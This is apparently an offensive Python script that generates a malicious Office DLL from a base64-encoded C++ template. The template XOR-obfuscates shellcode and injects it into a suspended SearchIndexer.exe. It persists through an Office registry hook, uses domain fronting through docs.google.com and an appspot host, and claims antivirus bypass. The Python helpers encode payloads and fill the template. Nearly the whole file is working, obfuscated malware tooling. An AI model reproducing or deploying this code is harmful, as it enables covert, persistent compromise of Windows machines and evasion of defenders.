import argparse
import binascii
from Crypto.Hash import MD5
from Crypto.Cipher import AES
from base64 import b64encode
from os import urandom
from string import Template
import os
import base64

#python ExploitGeneratorNew.py -s payloads/payload-32.bin -S payloads/payload-64.bin -k J -d test.test.test -p 443

#cat templates/encryptedShellcodeWrapper_new.cpp | base64 | tr -d '\n' > base64code
code64 = r"Ly8gT2ZmaWNlIERMTCBIaWphY2tpbmcKLy8gTXVsdGktYnl0ZSBjaGFyYWN0ZXIgc2V0IAovLyB1c2luZyBzdGF0aWMgbGlicmFyaWVzCi8vIFhPUmFuZERyb3AgYW5kIGNoZWNrIGNhbGxpbmcgcHJvY2VzcyB0byBieXBhc3MgQVYKLy8gY29uc3QgY2hhciAqaG9zdG5hbWUgPSAiMTkyLjE2OC4xMDIuMTI5IjsKLy8gYWRkcl9saXN0LnNpbl9wb3J0ID0gaHRvbnMoNDQzKTsKLy8gWE9SYW5kRHJvcChiaXRzLCAnSicsIGQpOyAKCiNpbmNsdWRlICJzdGRhZnguaCIKI2luY2x1ZGUgPHN0cmluZz4KI2luY2x1ZGUgPGF0bHN0ci5oPgojaW5jbHVkZSA8dGhyZWFkPgojaW5jbHVkZSA8dGxoZWxwMzIuaD4KI2luY2x1ZGUgPGZzdHJlYW0+CiNpbmNsdWRlIDx3czJ0Y3BpcC5oPgojaW5jbHVkZSA8V2luSFRUUC5oPgojcHJhZ21hIGNvbW1lbnQobGliLCAiV3MyXzMyLmxpYiIpCiNwcmFnbWEgY29tbWVudChsaWIsICJXaW5odHRwLmxpYiIpCgpzdGQ6OnN0cmluZyBvZmZpY2UxID0gIk9mIjsKc3RkOjpzdHJpbmcgb2ZmaWNlMiA9ICJmIjsKdHlwZWRlZiBCT09MKFdJTkFQSSAqTFBGTl9JU1dPVzY0UFJPQ0VTUykgKEhBTkRMRSwgUEJPT0wpOwpMUEZOX0lTV09XNjRQUk9DRVNTIGZuSXNXb3c2NFByb2Nlc3M7Ci8vdW5zaWduZWQgY2hhciBrZXlbXSA9IHsiSiJ9Owp1bnNpZ25lZCBsb25nIHNoc2l6ZSA9IDIwNDg7CgovL0ZvciBEZWJ1Z2luZwpQUk9DRVNTX0lORk9STUFUSU9OIHByb2Nlc3NJbmZvcm1hdGlvbiA9IHsgMCB9OwpTVEFSVFVQSU5GTyBzdGFydHVwSW5mbyA9IHsgMCB9OwoKI2lmZGVmIF9XSU42NAp1bnNpZ25lZCBjaGFyIGJpdHNbXSA9ICIke3NoZWxsY29kZTY0fSI7CiNlbHNlCnVuc2lnbmVkIGNoYXIgYml0c1tdID0gIiR7c2hlbGxjb2RlMzJ9IjsKI2VuZGlmCgpjb25zdCBpbnQgc2l6ZSA9IHNpemVvZiBiaXRzOwoKdW5zaWduZWQgY2hhciogc3RyWE9SKGNvbnN0IGNoYXIqIGUpCnsKCWNoYXIgayA9ICdKJzsKCXVuc2lnbmVkIGNoYXIgKmQgPSAodW5zaWduZWQgY2hhciopbWFsbG9jKHNpemVvZihlKSk7Cglmb3IgKGludCBpID0gMTsgaSA8IHNpemU7IGkrKykKCXsKCQlkW2ldID0gZVtpXSBeIGs7Cgl9CglyZXR1cm4gZDsKfQoKc3RkOjpzdHJpbmcgcHJvZ3JhbSgoY2hhciopJHtPZmZpY2V9KTsKCi8qIGhhbmQtcm9sbGVkIGJ6ZXJvIGZyb20gbWV0YXNwbG9pdCovCnZvaWQgYnplcm9fY3VzdCh2b2lkICpwLCBzaXplX3QgbCkKewoJQllURSAqcSA9IChCWVRFICopcDsKCXNpemVfdCB4ID0gMDsKCWZvciAoeCA9IDA7IHggPCBsOyB4KyspCgkJKihxKyspID0gMHgwMDsKfQoKCgovKlRlc3RzIGlmIHRoZSBzZXJ2ZXIgaXMgdXAgYW5kIGlmIHRoZSBzZXJ2ZXIgaGFzIGJlZW4gdW5yZWFjaGFibGUgZm9yIGEgc2V0IHBlcmlvZCBvZiB0aW1lCklmIGl0IGlzIG92ZXIgdGhlIHNldCBwZXJpb2Qgb2YgdGltZSwgdGhlIHJlZ2lzdHJ5IGtleSBpcyBkZWxldGVkKi8KYm9vbCB1cHRpbWUoKQp7CglEV09SRCBkd1NpemUgPSAwOwoJRFdPUkQgZHdEb3dubG9hZGVkID0gMDsKCS8vTFBTVFIgcHN6T3V0QnVmZmVyOwoJQk9PTCAgYlJlc3VsdHMgPSBGQUxTRSwgaHR0cFJlc3BvbnNlID0gTlVMTDsKCUhJTlRFUk5FVCAgaFNlc3Npb24gPSBOVUxMLAoJCWhDb25uZWN0ID0gTlVMTCwKCQloUmVxdWVzdCA9IE5VTEw7CglEV09SRCBkd1N0YXR1c0NvZGUgPSAwOwoJRFdPUkQgZHdTaXplMiA9IHNpemVvZihEV09SRCk7Cglib29sIG9wZW4gPSB0cnVlOwoKCWhTZXNzaW9uID0gV2luSHR0cE9wZW4oKExQQ1dTVFIpJHtVc2VyQWdlbnR9LAoJCVdJTkhUVFBfQUNDRVNTX1RZUEVfREVGQVVMVF9QUk9YWSwKCQlXSU5IVFRQX05PX1BST1hZX05BTUUsCgkJV0lOSFRUUF9OT19QUk9YWV9CWVBBU1MsIDApOwoJaWYgKGhTZXNzaW9uKQoJCWhDb25uZWN0ID0gV2luSHR0cENvbm5lY3QoaFNlc3Npb24sIChMUENXU1RSKSR7Q2xvdWRmcm9udH0sCgkJCUlOVEVSTkVUX0RFRkFVTFRfSFRUUFNfUE9SVCwgMCk7CglpZiAoaENvbm5lY3QpCgkJaFJlcXVlc3QgPSBXaW5IdHRwT3BlblJlcXVlc3QoaENvbm5lY3QsIEwiR0VUIiwgTlVMTCwKCQkJTlVMTCwgV0lOSFRUUF9OT19SRUZFUkVSLAoJCQlXSU5IVFRQX0RFRkFVTFRfQUNDRVBUX1RZUEVTLAoJCQlXSU5IVFRQX0ZMQUdfU0VDVVJFKTsKCWlmIChoUmVxdWVzdCkKCQlCT09MIGh0dHBSZXN1bHQgPSBXaW5IdHRwQWRkUmVxdWVzdEhlYWRlcnMoCgkJCWhSZXF1ZXN0LAoJCQkoTFBDV1NUUikke0hvc3R9LAoJCQktMUwsCgkJCTApOwoJaWYgKGhSZXF1ZXN0KQoJCWJSZXN1bHRzID0gV2luSHR0cFNlbmRSZXF1ZXN0KGhSZXF1ZXN0LAoJCQlXSU5IVFRQX05PX0FERElUSU9OQUxfSEVBREVSUywgMCwKCQkJV0lOSFRUUF9OT19SRVFVRVNUX0RBVEEsIDAsCgkJCTAsIDApOwoJaWYgKGJSZXN1bHRzKQoJCWh0dHBSZXNwb25zZSA9IFdpbkh0dHBSZWNlaXZlUmVzcG9uc2UoaFJlcXVlc3QsIE5VTEwpOwoJaWYgKGh0dHBSZXNwb25zZSkKCQliUmVzdWx0cyA9IFdpbkh0dHBRdWVyeUhlYWRlcnMoaFJlcXVlc3QsIFdJTkhUVFBfUVVFUllfU1RBVFVTX0NPREUgfCBXSU5IVFRQX1FVRVJZX0ZMQUdfTlVNQkVSLCBOVUxMLCAmZHdTdGF0dXNDb2RlLCAmZHdTaXplMiwgTlVMTCk7CglpZiAoZHdTdGF0dXNDb2RlID09IDUwMikKCQlvcGVuID0gZmFsc2U7CgllbHNlCgkJb3BlbiA9IHRydWU7CgkKCS8vTG9nIGNvbm5lY3Rpb24gZmFpbHVyZSAKCWlmICghb3BlbikKCXsKCQl0aW1lX3QgQ3VycmVudERhdGUsIExhc3RmYWlsdWU7CgkJQ3VycmVudERhdGUgPSB0aW1lKDApOwoJCXRpbWVfdCBzZWNvbmRzID0gMCwgbWludXRlcyA9IDAsIGhvdXJzID0gMCwgZGF5cyA9IDAsIG1vbnRocyA9IDA7CgkJc3RkOjpmc3RyZWFtIGZpbGVfaW4oKExQQ1dTVFIpJHtBRFN9LCBzdGQ6Omlvc19iYXNlOjpiaW5hcnkgfCBzdGQ6Omlvc19iYXNlOjppbik7CgoJCS8vQ2hlY2sgaWYgYSBjb25uZWN0aW9uIGZhaWx1cmUgYWxyZWFkeSBvY2N1cmVkIGFuZCBpZiBpdCBpcyBvdmVyIG91ciBsaW1pdAoJCWlmIChmaWxlX2luLnBlZWsoKSAhPSBzdGQ6Omlmc3RyZWFtOjp0cmFpdHNfdHlwZTo6ZW9mKCkpCgkJewoJCQlmaWxlX2luLnJlYWQoKGNoYXIqKSZMYXN0ZmFpbHVlLCBzaXplb2YodGltZV90KSk7CgkJCWZpbGVfaW4uY2xvc2UoKTsKCgkJCXNlY29uZHMgPSBDdXJyZW50RGF0ZSAtIExhc3RmYWlsdWU7CgkJCW1pbnV0ZXMgPSBzZWNvbmRzIC8gNjA7CgkJCWhvdXJzID0gc2Vjb25kcyAvICg2MCAqIDYwKTsKCgkJCS8vY2hlY2sgaWYgbGltaXQgaGFzIGJlZW4gcmVhY2hlZAoJCQlpZiAoaG91cnMgPiAxKQoJCQl7CgkJCQlIS0VZIGhLZXkgPSBOVUxMOwoJCQkJbG9uZyBvcGVua2V5ID0gUmVnT3BlbktleUV4KEhLRVlfQ1VSUkVOVF9VU0VSLCAoTFBDU1RSKSgke1JlZ0tleX0pLCAwTCwgS0VZX1NFVF9WQUxVRSwgJmhLZXkpOwoJCQkJUmVnRGVsZXRlS2V5KEhLRVlfQ1VSUkVOVF9VU0VSLCAoTFBDU1RSKSgke1JlZ0tleX0pKTsKCQkJfQoJCX0KCQkvL0RvY3VtZW50IGZpcnN0IGNvbm5lY3Rpb24gZmFpbHVyZQoJCWVsc2UKCQl7CgkJCWZpbGVfaW4uY2xvc2UoKTsKCQkJc3RkOjpmc3RyZWFtIGZpbGVfb3V0KChMUENTVFIpJHtBRFN9LCBzdGQ6Omlvc19iYXNlOjpiaW5hcnkgfCBzdGQ6Omlvc19iYXNlOjpvdXQpOwoJCQlmaWxlX291dC53cml0ZSgoY2hhciAqKSZDdXJyZW50RGF0ZSwgc2l6ZW9mKHRpbWVfdCkpOwoJCQlmaWxlX291dC5jbG9zZSgpOwoJCX0KCX0KCWVsc2UKCXsKCQl0aW1lX3QgTGFzdGZhaWx1ZTsKCQlzdGQ6OmZzdHJlYW0gZmlsZV9vdXQoKExQQ1NUUikke0FEU30sIHN0ZDo6aW9zOjpiaW5hcnkgfCBzdGQ6Omlvc19iYXNlOjpvdXQgfCBzdGQ6Omlvc19iYXNlOjp0cnVuYyk7CgkJZmlsZV9vdXQuY2xvc2UoKTsKCQlzdGQ6OmZzdHJlYW0gZmlsZV9pbigoTFBDU1RSKSR7QURTfSwgc3RkOjppb3NfYmFzZTo6YmluYXJ5IHwgc3RkOjppb3NfYmFzZTo6aW4pOwoJCWlmIChmaWxlX2luLnBlZWsoKSAhPSBzdGQ6Omlmc3RyZWFtOjp0cmFpdHNfdHlwZTo6ZW9mKCkpCgkJewoJCQlmaWxlX2luLnJlYWQoKGNoYXIqKSZMYXN0ZmFpbHVlLCBzaXplb2YodGltZV90KSk7CgkJfQoJCWZpbGVfaW4uY2xvc2UoKTsKCX0KCXJldHVybiBvcGVuOwp9CgovL0ZpbmRzIHRoZSB0aGUgcHJvY2VzcyBvd25lciB0byBlbnN1cmUgd2UgYXJlIGxvb2tpbmcgYXQgdGhlIGNvcnJlY3QgcHJvY2Vzcwpib29sIEV4dHJhY3RQcm9jZXNzT3duZXIoSEFORExFIGhQcm9jZXNzX2ksCglDU3RyaW5nJiBjc093bmVyX28pCnsKCQoJLy8gR2V0IHByb2Nlc3MgdG9rZW4KCUhBTkRMRSBoUHJvY2Vzc1Rva2VuID0gTlVMTDsKCWlmICghOjpPcGVuUHJvY2Vzc1Rva2VuKGhQcm9jZXNzX2ksIFRPS0VOX1JFQUQsICZoUHJvY2Vzc1Rva2VuKSB8fCAhaFByb2Nlc3NUb2tlbikKCXsKCQlyZXR1cm4gZmFsc2U7Cgl9CgoJLy8gRmlyc3QgZ2V0IHNpemUgbmVlZGVkLCBUb2tlblVzZXIgaW5kaWNhdGVzIHdlIHdhbnQgdXNlciBpbmZvcm1hdGlvbiBmcm9tIGdpdmVuIHRva2VuCglEV09SRCBkd1Byb2Nlc3NUb2tlbkluZm9BbGxvY1NpemUgPSAwOwoJOjpHZXRUb2tlbkluZm9ybWF0aW9uKGhQcm9jZXNzVG9rZW4sIFRva2VuVXNlciwgTlVMTCwgMCwgJmR3UHJvY2Vzc1Rva2VuSW5mb0FsbG9jU2l6ZSk7CgoJLy8gQ2FsbCBzaG91bGQgaGF2ZSBmYWlsZWQgZHVlIHRvIHplcm8tbGVuZ3RoIGJ1ZmZlci4KCWlmICg6OkdldExhc3RFcnJvcigpID09IEVSUk9SX0lOU1VGRklDSUVOVF9CVUZGRVIpCgl7CgkJLy8gQWxsb2NhdGUgYnVmZmVyIGZvciB1c2VyIGluZm9ybWF0aW9uIGluIHRoZSB0b2tlbi4KCQlQVE9LRU5fVVNFUiBwVXNlclRva2VuID0gcmVpbnRlcnByZXRfY2FzdDxQVE9LRU5fVVNFUj4obmV3IEJZVEVbZHdQcm9jZXNzVG9rZW5JbmZvQWxsb2NTaXplXSk7CgkJaWYgKHBVc2VyVG9rZW4gIT0gTlVMTCkKCQl7CgkJCS8vIE5vdyBnZXQgdXNlciBpbmZvcm1hdGlvbiBpbiB0aGUgYWxsb2NhdGVkIGJ1ZmZlcgoJCQlpZiAoOjpHZXRUb2tlbkluZm9ybWF0aW9uKGhQcm9jZXNzVG9rZW4sIFRva2VuVXNlciwgcFVzZXJUb2tlbiwgZHdQcm9jZXNzVG9rZW5JbmZvQWxsb2NTaXplLCAmZHdQcm9jZXNzVG9rZW5JbmZvQWxsb2NTaXplKSkKCQkJewoJCQkJLy8gU29tZSB2YXJzIHRoYXQgd2UgbWF5IG5lZWQKCQkJCVNJRF9OQU1FX1VTRSAgIHNudVNJRE5hbWVVc2U7CgkJCQlUQ0hBUiAgICAgICAgICBzelVzZXJbTUFYX1BBVEhdID0geyAwIH07CgkJCQlEV09SRCAgICAgICAgICBkd1VzZXJOYW1lTGVuZ3RoID0gTUFYX1BBVEg7CgkJCQlUQ0hBUiAgICAgICAgICBzekRvbWFpbltNQVhfUEFUSF0gPSB7IDAgfTsKCQkJCURXT1JEICAgICAgICAgIGR3RG9tYWluTmFtZUxlbmd0aCA9IE1BWF9QQVRIOwoKCQkJCS8vIFJldHJpZXZlIHVzZXIgbmFtZSBhbmQgZG9tYWluIG5hbWUgYmFzZWQgb24gdXNlcidzIFNJRC4KCQkJCWlmICg6Okxvb2t1cEFjY291bnRTaWQoTlVMTCwKCQkJCQlwVXNlclRva2VuLT5Vc2VyLlNpZCwKCQkJCQlzelVzZXIsCgkJCQkJJmR3VXNlck5hbWVMZW5ndGgsCgkJCQkJc3pEb21haW4sCgkJCQkJJmR3RG9tYWluTmFtZUxlbmd0aCwKCQkJCQkmc251U0lETmFtZVVzZSkpCgkJCQl7CgkJCQkJLy8gUHJlcGFyZSB1c2VyIG5hbWUgc3RyaW5nCgkJCQkJY3NPd25lcl9vID0gX1QoIlxcXFwiKTsKCQkJCQljc093bmVyX28gKz0gc3pEb21haW47CgkJCQkJY3NPd25lcl9vICs9IF9UKCJcXCIpOwoJCQkJCWNzT3duZXJfbyArPSBzelVzZXI7CgoJCQkJCS8vIFdlIGFyZSBkb25lIQoJCQkJCUNsb3NlSGFuZGxlKGhQcm9jZXNzVG9rZW4pOwoJCQkJCWRlbGV0ZVtdIHBVc2VyVG9rZW47CgoJCQkJCS8vIFdlIHN1Y2NlZWRlZAoJCQkJCXJldHVybiB0cnVlOwoJCQkJfQoJCQl9CgoJCQlkZWxldGVbXSBwVXNlclRva2VuOwoJCX0KCX0KCglDbG9zZUhhbmRsZShoUHJvY2Vzc1Rva2VuKTsKCXJldHVybiBmYWxzZTsKfQoKLy9DaGVja3MgaXMgdGhlIHByb2Nlc3MgaXMgYWxyZWFkeSBydW5uaW5nIHRvIGF2b2lkIG11bHRpcGxlIGV4ZWN1dGlvbnMKYm9vbCBDaGVja0lmUnVubmluZygpIHsKCWJvb2wgc2FmZXRvZXhlYyA9IHRydWU7CglQUk9DRVNTRU5UUlkzMiBlbnRyeTsKCWVudHJ5LmR3U2l6ZSA9IHNpemVvZihQUk9DRVNTRU5UUlkzMik7CglDU3RyaW5nIGNzT3duZXJfbyA9ICIiOwoKCUhBTkRMRSBzbmFwc2hvdCA9IENyZWF0ZVRvb2xoZWxwMzJTbmFwc2hvdChUSDMyQ1NfU05BUFBST0NFU1MsIE5VTEwpOwoKCWNoYXIgdXNlcm5hbWVbMjU2ICsgMV07CglEV09SRCB1c2VybmFtZV9sZW4gPSAyNTYgKyAxOwoJR2V0VXNlck5hbWUodXNlcm5hbWUsICZ1c2VybmFtZV9sZW4pOwoKCWlmIChQcm9jZXNzMzJGaXJzdChzbmFwc2hvdCwgJmVudHJ5KSA9PSBUUlVFKQoJewoJCXdoaWxlIChQcm9jZXNzMzJOZXh0KHNuYXBzaG90LCAmZW50cnkpID09IFRSVUUpCgkJewoJCQlpZiAoX3N0cmljbXAoZW50cnkuc3pFeGVGaWxlLCAoY29uc3QgY2hhciopJHtQcm9jZXNzTmFtZX0pID09IDApCgkJCXsKCQkJCUhBTkRMRSBoUHJvY2VzcyA9IE9wZW5Qcm9jZXNzKFBST0NFU1NfQUxMX0FDQ0VTUywgRkFMU0UsIGVudHJ5LnRoMzJQcm9jZXNzSUQpOwoKCQkJCUV4dHJhY3RQcm9jZXNzT3duZXIoaFByb2Nlc3MsIGNzT3duZXJfbyk7CgkJCQlpZiAoY3NPd25lcl9vICE9ICIiICAmJiBjc093bmVyX28uRmluZCh1c2VybmFtZSkgIT0gLTEpCgkJCQl7CgkJCQkJc2FmZXRvZXhlYyA9IGZhbHNlOwoJCQkJfQoJCQkJQ2xvc2VIYW5kbGUoaFByb2Nlc3MpOwoJCQl9CgkJfQoJfQoJQ2xvc2VIYW5kbGUoc25hcHNob3QpOwoJcmV0dXJuIHNhZmV0b2V4ZWM7Cn0KCmJvb2wgU2FmZXRvRXhlY3V0ZSgpCnsKCWJvb2wgc2FmZXRvZXhlYyA9IGZhbHNlOwoJV0NIQVIgcGF0aFtNQVhfUEFUSF0gPSB7IDAgfTsKCUdldE1vZHVsZUZpbGVOYW1lVyhOVUxMLCBwYXRoLCBNQVhfUEFUSCk7CglzdGQ6OndzdHJpbmcgd3MocGF0aCk7CglzdGQ6OnN0cmluZyBmdWxscGF0aCh3cy5iZWdpbigpLCB3cy5lbmQoKSk7CglzdGQ6OnN0cmluZyBvZmZpY2UzID0gImljIjsKCXN0ZDo6c3RyaW5nIG9mZmljZTQgPSAiZSI7CgkvL3N0ZDo6c2l6ZV90IGZvdW5kMyA9IGZ1bGxwYXRoLmZpbmQob2ZmaWNlMSArIG9mZmljZTIgKyBvZmZpY2UzICsgb2ZmaWNlNCk7CglzdGQ6OnNpemVfdCBmb3VuZDMgPSBmdWxscGF0aC5maW5kKHByb2dyYW0pOwoJCglTZXRFbnZpcm9ubWVudFZhcmlhYmxlKFRFWFQoInBhdGhpbmZvViIpLCBmdWxscGF0aC5jX3N0cigpKTsKCWlmIChmb3VuZDMgIT0gc3RkOjpzdHJpbmc6Om5wb3MpCgl7CgkJc2FmZXRvZXhlYyA9IENoZWNrSWZSdW5uaW5nKCk7Cgl9CglyZXR1cm4gc2FmZXRvZXhlYzsKfQoKLy9YT1JQYXlsb2FkRnVuY3Rpb24KLy9lIGlzIHRoZSB4b3InZWQgcGF5bG9hZAovL2sgaXMgdGhlIGtleQovL2QgaXMgdGhlIHJldHVybmVkIHBheWxvYWQKLy92b2lkIFhPUmFuZERyb3AodW5zaWduZWQgY2hhciogZSwgdW5zaWduZWQgY2hhciogaywgdW5zaWduZWQgY2hhciogZCkKdm9pZCBYT1JhbmREcm9wKHVuc2lnbmVkIGNoYXIqIGUsIGNoYXIgaywgdW5zaWduZWQgY2hhciogZCkKewoJaW50IGogPSAwOwoJZm9yIChpbnQgaSA9IDE7IGkgPCBzaXplOyBpID0gaSArIDIpCgl7CgkJLy9kW2pdID0gZVtpXSBeIGtbaV07CgkJZFtqXSA9IGVbaV0gXiBrOwoJCWorKzsKCX0KCQp9Cgp2b2lkIEV4ZWNQYXkodm9pZCkgewoJY2hhciBwcm9jZXNzWzQwXTsKCXN0cm5jcHlfcyhwcm9jZXNzLCR7UHJvY2Vzc05hbWV9LCBzaXplb2YocHJvY2VzcykgLSAxKTsKCVBST0NFU1NfSU5GT1JNQVRJT04gcHJvc2luZjsKCVNUQVJUVVBJTkZPIHN0YXJ0aW5mOwoJQ09OVEVYVCBjb250eDsKCUxQVk9JRCBycDsKCXVuc2lnbmVkIGNoYXIgZFtzaXplLzJdOwoJUFJPQ0VTU19JTkZPUk1BVElPTiBwcm9jZXNzSW5mb3JtYXRpb24gPSB7IDAgfTsKCVNUQVJUVVBJTkZPIHN0YXJ0dXBJbmZvID0geyAwIH07CgkvLyBTdGFydCB1cCB0aGUgcGF5bG9hZCBpbiBhIG5ldyBwcm9jZXNzCgliemVyb19jdXN0KCZzdGFydGluZiwgc2l6ZW9mKHN0YXJ0aW5mKSk7CglzdGFydGluZi5jYiA9IHNpemVvZihzdGFydGluZik7CgkvL0NyZWF0ZVByb2Nlc3MoIkM6XFxXaW5kb3dzXFxTeXN0ZW0zMlxcY21kLmV4ZSIsIE5VTEwsIE5VTEwsIE5VTEwsIEZBTFNFLCBOT1JNQUxfUFJJT1JJVFlfQ0xBU1MsIE5VTEwsICJDOlxcV2luZG93c1xcU3lzdGVtMzIiLCAmc3RhcnR1cEluZm8sICZwcm9jZXNzSW5mb3JtYXRpb24pOwoKCS8vIENyZWF0ZSBhIHN1c3BlbmRlZCBwcm9jZXNzLCB3cml0ZSBzaGVsbGNvZGUgaW50byBzdGFjaywgbWFrZSBzdGFjayBSV1gsIHJlc3VtZSBpdAoJaWYgKENyZWF0ZVByb2Nlc3MoMCwgcHJvY2VzcywgMCwgMCwgMCwgQ1JFQVRFX1NVU1BFTkRFRCB8IElETEVfUFJJT1JJVFlfQ0xBU1MsIDAsIDAsICZzdGFydGluZiwgJnByb3NpbmYpKSB7CgkJY29udHguQ29udGV4dEZsYWdzID0gQ09OVEVYVF9JTlRFR0VSIHwgQ09OVEVYVF9DT05UUk9MOwoJCUdldFRocmVhZENvbnRleHQocHJvc2luZi5oVGhyZWFkLCAmY29udHgpOwoKCQlycCA9IChMUFZPSUQpVmlydHVhbEFsbG9jRXgocHJvc2luZi5oUHJvY2VzcywgTlVMTCwgc2hzaXplLCBNRU1fQ09NTUlULCBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFKTsKCgkJWE9SYW5kRHJvcChiaXRzLCAnSicsIGQpOwoKCQlXcml0ZVByb2Nlc3NNZW1vcnkocHJvc2luZi5oUHJvY2VzcywgKFBWT0lEKXJwLCAmZCwgc2hzaXplLCAwKTsKCQkjaWZkZWYgX1dJTjY0CgkJCQljb250eC5SaXAgPSAoRFdPUkQ2NClycDsKCQkjZWxzZQoJCQkJY29udHguRWlwID0gKERXT1JEKXJwOwoJCSNlbmRpZgoKCQlTZXRUaHJlYWRDb250ZXh0KHByb3NpbmYuaFRocmVhZCwgJmNvbnR4KTsKCgkJUmVzdW1lVGhyZWFkKHByb3NpbmYuaFRocmVhZCk7CgkJLy9DcmVhdGVQcm9jZXNzKCJDOlxcV2luZG93c1xcU3lzdGVtMzJcXGNtZC5leGUiLCBOVUxMLCBOVUxMLCBOVUxMLCBGQUxTRSwgTk9STUFMX1BSSU9SSVRZX0NMQVNTLCBOVUxMLCAiQzpcXFdpbmRvd3MiLCAmc3RhcnR1cEluZm8sICZwcm9jZXNzSW5mb3JtYXRpb24pOwoJCUNsb3NlSGFuZGxlKHByb3NpbmYuaFRocmVhZCk7CgkJQ2xvc2VIYW5kbGUocHJvc2luZi5oUHJvY2Vzcyk7Cgl9CglyZXR1cm47Cn0KCnZvaWQgUHJlcFBheSh2b2lkKQp7Cglib29sIHNhZmV0b2V4ZWMgPSBmYWxzZTsKCWJvb2wgb3BlbiA9IGZhbHNlOwoJQk9PTCByZXN1bHQgPSB0cnVlOwoJaW50IHZhbHVlTGVuZ3RoID0gNTEyOwoJVENIQVIqIGVudlZhclZhbHVlID0gbmV3IFRDSEFSW3ZhbHVlTGVuZ3RoXTsKCURXT1JEIGxlbiA9IE5VTEw7CgkvL1VzZXMgZW52aXJvbm1lbnQgdmFyaWFibGUgdG8gc3RvcCBtdWx0aXBsZSBleGVjdXRpb25zIHBlciBkb2N1bWVudCBvcGVuLgoJbGVuID0gR2V0RW52aXJvbm1lbnRWYXJpYWJsZSgiUFJPQ0VTU09SX0NPUkVTIiwgZW52VmFyVmFsdWUsIHZhbHVlTGVuZ3RoKTsKCWlmICghbGVuKQoJewoJCWlmIChTYWZldG9FeGVjdXRlKCkpCgkJewoJCQlTZXRFbnZpcm9ubWVudFZhcmlhYmxlKChURVhUKCJQUk9DRVNTT1JfQ09SRVMiKSksIChURVhUKCIxIikpKTsKCQkJb3BlbiA9IHVwdGltZSgpOwoJCQlzYWZldG9leGVjID0gdHJ1ZTsKCQl9CgkJaWYgKHNhZmV0b2V4ZWMgJiYgb3BlbikKCQl7CgoJCQlCT09MIHJlc3VsdCA9IHRydWU7CgkJCWludCB2YWx1ZUxlbmd0aCA9IDUxMjsKCQkJVENIQVIqIGVudlZhclZhbHVlID0gbmV3IFRDSEFSW3ZhbHVlTGVuZ3RoXTsKCQkJRFdPUkQgbGVuID0gTlVMTDsKCQkJRXhlY1BheSgpOwoJCX0KCgl9CglyZXR1cm47Cn0KCkJPT0wgQVBJRU5UUlkgRGxsTWFpbiggSE1PRFVMRSBoTW9kdWxlLAogICAgICAgICAgICAgICAgICAgICAgIERXT1JEICB1bF9yZWFzb25fZm9yX2NhbGwsCiAgICAgICAgICAgICAgICAgICAgICAgTFBWT0lEIGxwUmVzZXJ2ZWQKICAgICAgICAgICAgICAgICAgICAgKQp7CglQUk9DRVNTX0lORk9STUFUSU9OIHByb2Nlc3NJbmZvcm1hdGlvbiA9IHsgMCB9OwoJU1RBUlRVUElORk8gc3RhcnR1cEluZm8gPSB7IDAgfTsKCXN3aXRjaCAodWxfcmVhc29uX2Zvcl9jYWxsKQogICAgewogICAgY2FzZSBETExfUFJPQ0VTU19BVFRBQ0g6CgkJI2lmZGVmIF9XSU4zMgoJCQlQcmVwUGF5KCk7CgkJI2VuZGlmCgkJYnJlYWs7CiAgICBjYXNlIERMTF9USFJFQURfQVRUQUNIOgoJCWJyZWFrOwogICAgY2FzZSBETExfVEhSRUFEX0RFVEFDSDoKCQlicmVhazsKICAgIGNhc2UgRExMX1BST0NFU1NfREVUQUNIOgogICAgICAgIGJyZWFrOwogICAgfQogICAgcmV0dXJuIFRSVUU7Cn0KCiNpZmRlZiBfV0lONjQKLy9FeHBsb2l0IG1vdmVkIHRvIGV4dGVybiBmb3Igc2FmZXIgZXhlY3V0aW9uCmV4dGVybiAiQyIgX19kZWNsc3BlYyhkbGxleHBvcnQpIHZvaWQgR2V0UGVyZmhvc3RIb29rVmVyc2lvbigpCnsKCVByZXBQYXkoKTsKCXJldHVybjsKfQoKZXh0ZXJuICJDIiBfX2RlY2xzcGVjKGRsbGV4cG9ydCkgdm9pZCBfUGVyZkNvZGVNYXJrZXIoKQp7CgkvL1ByZXBQYXkoKTsKCXJldHVybjsKfQoKCmV4dGVybiAiQyIgX19kZWNsc3BlYyhkbGxleHBvcnQpIHZvaWQgX1VuSW5pdFBlcmYoKQp7CgkvL1ByZXBQYXkoKTsKCXJldHVybjsKfQoKI2VuZGlmCg=="

Office = "Office"
UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
Cloudfront = "docs.google.com"
Host = "Host: XXXX.appspot.com"
ADS = "C:\\ProgramData\\Microsoft OneDrive\\Packages\\%PROCESSOR_ARCHITECTURE%\\OneDriveSetup2.exe:date"
RegKey = "SOFTWARE\\Microsoft\\Office test\\Special\\Perf"
ProcessName = "\"SearchIndexer.exe\""

resultFiles = {
	'cpp': './result/officeDLL.cpp',
}

def xor (data, key):
    l = len(key)
    keyAsInt = map(ord,key)
    newdata = [None]* len(data)
    for i in range(0,len(data)):
        newdata[i] = (data[i] ^ keyAsInt[0])
    result = bytes(bytearray((newdata)))
    return result

def printhex(data):
    return '[{}]'.format(', '.join(hex(x) for x in data))

def xor_drop(data, key):
    l = len(key)
    print "Orginal: " + printhex(data)
    newl = len(data) * 2 
    keyAsInt = map(ord,key)
    print keyAsInt
    rand = 0x47
    newdata = [None]* newl
    for i in range(0,len(data)):
        rand = keyAsInt[0] ^ data[i] ^ rand
        newdata[(i*2)] = rand
        
        newdata[(i*2)+1] = (data[i] ^ keyAsInt[0])
    result = bytes(bytearray((newdata)))
    return result

def color(string, color=None):
    """
    Author: HarmJ0y, borrowed from Empire
    Change text color for the Linux terminal.
    """
    
    attr = []
    # bold
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

    else:
        if string.strip().startswith("[!]"):
            attr.append('31')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[+]"):
            attr.append('32')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[?]"):
            attr.append('33')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[*]"):
            attr.append('34')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        else:
            return string

def convertFromTemplate(parameters):
    try:
        #src = Template(f.read())
        src = Template(base64.b64decode(code64))
        result = src.substitute(parameters)
        return result
    except IOError:
        print color("[!] Could not open or read template file [{}]".format(templateFile))
        return None


